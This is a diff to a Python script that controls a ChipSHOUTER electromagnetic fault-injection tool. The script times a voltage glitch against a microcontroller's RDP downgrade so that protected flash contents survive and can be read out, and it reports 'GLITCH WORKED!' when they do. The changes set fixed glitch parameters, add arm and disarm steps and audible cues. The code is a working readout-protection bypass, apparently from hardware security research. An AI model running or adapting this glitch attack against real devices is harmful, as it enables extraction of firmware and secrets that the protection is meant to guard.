@@ -39,21 +39,24 @@ test_data.extend(b"SIMON_SIMON_SIMO")  # 16 bytes
 
 
 def arm_chipshouter(cs, voltage=400, width=160, repeat=10, deadtime=1):
-    try:
-        # reset fault
-        print(f"Arming chipshouter with voltage: {voltage}, width: {width}, repeat: {repeat}, deadtime: {deadtime}")
-        print(f"Current temperature: {cs.temperature_diode} {cs.temperature_mosfet} {cs.temperature_xformer}")
-        cs.faults_current = 0 
-        cs.voltage = voltage
-        cs.pulse.width = width
-        cs.armed = 1
-        cs.pulse.repeat = repeat
-        cs.pulse.deadtime = deadtime
-        time.sleep(0.1)
-    except Exception as e:
-        print(f"Error arming chipshouter: {e}")
-        return False
-    return True
+    # reset fault
+    print(f"Arming chipshouter with voltage: {voltage}, width: {width}, repeat: {repeat}, deadtime: {deadtime}")
+    print(f"Current temperature: {cs.temperature_diode} {cs.temperature_mosfet} {cs.temperature_xformer}")
+    state = cs.state
+    print(f"Current state: {state}")
+    cs.faults_current = 0 
+    print(f"current state: {cs.state}")
+    cs.voltage = voltage
+    cs.pulse.width = width
+    cs.pulse.repeat = repeat
+    cs.pulse.deadtime = deadtime
+    #cs.pulse = 0
+    cs.armed = 1
+    announce("armed")  # audible cue
+    print(f"current state: {cs.state}")
+    time.sleep(3)
+    #time.sleep(1)
+    #cs.armed = 0
 
 def glitch_on(cs, pulse=10):
     # print(cs) #get all values of device
@@ -230,7 +233,7 @@ def set_rdp_level_1():
         if os.path.exists('new_option_bytes.bin'):
             os.remove('new_option_bytes.bin')
 
-def set_rdp_level_0(fast=False):
+def set_rdp_level_0():
     """Set RDP to level 0"""
     if verbose:
         print("\n" + "!"*60)
@@ -272,11 +275,8 @@ def set_rdp_level_0(fast=False):
         if verbose:
             print(f"SENDING command: {' '.join(cmd)}")
         
-        result = subprocess.run(cmd, capture_output=not fast, text=not fast)
+        result = subprocess.run(cmd, capture_output=True, text=True)
 
-        if fast:
-            return True
-        
         if verbose:
             print("STDOUT:", result.stdout)
             print("STDERR:", result.stderr)
@@ -336,18 +336,25 @@ def check_data_protected(data):
         print("data: ", data)
     return data[:16] == data_expected
 
+def disarm_chipshouter(cs):
+    cs.armed = 0
+    cs.pulse = 0
+    cs.mute = True
+    announce("disarmed")  # audible cue
 
-def run_whole_glitch(cs, voltage=300, width=100, repeat=10, deadtime=1):
-    arm_chipshouter(cs, voltage=voltage, width=width, repeat=repeat, deadtime=deadtime)
-    
+def run_whole_glitch(cs, voltage=500, width=80, repeat=1, deadtime=1):
     if not check_tools():
         return False
-    get_device_info()
+    #get_device_info()
 
+    disarm_chipshouter(cs)
+    time.sleep(1)
+    reset_device()
     set_rdp_level_0()
+    reset_device()
     time.sleep(0.1)
     write_flash()
-    reset_device()
+    #reset_device()
     time.sleep(0.1)
 
     data_after = read_flash("after writing to flash")
@@ -373,22 +380,30 @@ def run_whole_glitch(cs, voltage=300, width=100, repeat=10, deadtime=1):
     
     # now setting rdp0 
     ## GLITCH HERE!!!!! 
-    # exec glitch in seperate thread
-    glitch_thread = threading.Thread(target=glitch_on, args=(cs, 1))
-    glitch_thread.start()
-    set_rdp_level_0(fast=True)
-    #### GLITCH HERE!!!!! 
+    time.sleep(1)
+    arm_chipshouter(cs, voltage=voltage, width=width, repeat=repeat, deadtime=deadtime)
 
+    # exec glitch in seperate thread
+    #glitch_on(cs, 1)
+    # glitch_thread = threading.Thread(target=glitch_on, args=(cs, 1))
+    # glitch_thread.start()
+    announce("fire")  # audible cue
+    set_rdp_level_0()
+    #### GLITCH HERE!!!!! 
+    time.sleep(1)
+    cs.armed = 0
     # make sure data is all 0 now
     data_after = read_flash("(after RDP)", print_binary_file_location=True)
     has_to_be_0 = check_data_0(data_after)
     if not has_to_be_0:
         # if not all 0 check if data is same as test_data
         if check_data_write(data_after):
+            announce("BZZ BZZZ")
             print("GLITCH WORKED!")
             print(data_to_ascii(data_after))
             return True
         else:
+            announce("failed...")
             print("GLITCH PROGRESS! We blasted the sram")
             return False
     else:
@@ -400,15 +415,27 @@ def run_demo():
     print("="*50)
 
     cs = ChipSHOUTER(comport='/dev/cu.usbserial-NA4PPWV9')
-    for i in range(10):
-        width = random.randint(10, 200)
-        repeat = random.randint(1, 20)
-        deadtime = random.randint(1, 10)
-        run_whole_glitch(cs, voltage=400, width=width, repeat=repeat, deadtime=deadtime)
+    for i in range(1):
+        width = 80
+        repeat = 1
+        deadtime = 1
+        voltage = 500
+        run_whole_glitch(cs, voltage=voltage, width=width, repeat=repeat, deadtime=deadtime)
         time.sleep(1)
 
     
     return True
+
+# Rationale: Add minimal audible cues via macOS 'say' without blocking main flow. Wrapped in try/except for robustness.
+def announce(message: str) -> None:
+    # if not mac return 
+    if not sys.platform.startswith('darwin'):
+        return
+    try:
+        subprocess.Popen(['say', message], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception as e:
+        if verbose:
+            print(f"[announce] failed: {e}")
 
 if __name__ == "__main__":
     run_demo()
